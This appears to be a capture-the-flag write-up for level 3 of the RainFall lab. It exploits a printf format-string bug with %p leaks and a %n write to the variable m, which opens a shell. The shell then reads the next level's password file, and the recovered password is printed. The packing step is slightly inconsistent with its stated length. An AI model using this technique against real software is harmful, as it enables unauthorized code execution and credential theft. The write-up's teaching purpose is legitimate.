# Level 3

In this level we can see that we need to edit the value of the variable `m` to `0x40` in order to get a shellh
```asm
   0x080484da <+54>:    mov    0x804988c,%eax
   0x080484df <+59>:    cmp    $0x40,%eax
   0x080484e2 <+62>:    jne    0x8048518 <v+116>
```
The input is read with the secure function `fgets`, our exploit lies elsewhere, in `printf`.

## The exploit
```shell
level3@RainFall:~$ ./level3 
%p %p %p %p
0x200 0xb7fd1ac0 0xb7ff37d0 0x25207025
```
Odd, we're getting the value of the argument of fgets and what strongly looks like stack addresses, which means....

```shell
level3@RainFall:~$ ./level3 <<< `python -c 'print "0000" + "%p "*10'`
00000x200 0xb7fd1ac0 0xb7ff37d0 0x30303030 0x25207025 0x70252070 0x20702520 0x25207025 0x70252070 0x20702520
```
we can see that the 4th pointer gets modified by our printf format string, nice!

Let's simplify our string a bit now that we know which argument we can act on

```shell
level3@RainFall:~$ ./level3 <<< `python -c 'print "0000%4$p"'`
00000x30303030
```

## Inserting the address
```shell
level3@RainFall:~$ objdump -t ./level3  | grep m
[...]
0804988c g     O .bss   00000004              m
[...]
```
the value of `m` is `0x804988c`, we can get it from `gdb`, `r2` or `objdump`

let's insert it as a value
```shell
level3@RainFall:~$ ./level3 <<< `python -c 'import struct; print struct.pack("<Q", 0x804988c) + "%4$p"'`
0x804988c
```

## Modifying memory
Now that we have access to the address of `m`, we can use `%n` to write a number to it as the BUG section of `printf` man tells us. 
The flag `%n` writes the number of character written so far to the pointer passed as argument, perfect to modify the value of `m`!

Since our format string is 4 bytes long, we need to add 60 more bytes

```shell
./level3 <<< `python -c 'import struct; print struct.pack("<Q", 0x804988c) + "a"*60 + "%4$n"'`
aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa
Wait what?!
```

We won! we just need to find a way to keep the shell open now.

## Putting it together
We can add `"A"*4028` followed with our glorious command to get the password, it is just a way to wait until the shell is ready to read from stdin again.

```shell
level3@RainFall:~$ ./level3 <<< `python -c 'import struct; print struct.pack("<Q", 0x804988c) + "a"*60 + "%4
$n" + "A"*4028 + "cat /home/user/level4/.pass"'`
aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAWait what?!
b209ea91ad69ef36f2cf0fcbbc24c739fd10464cf545b20bea8572ebdc3c36fa
```
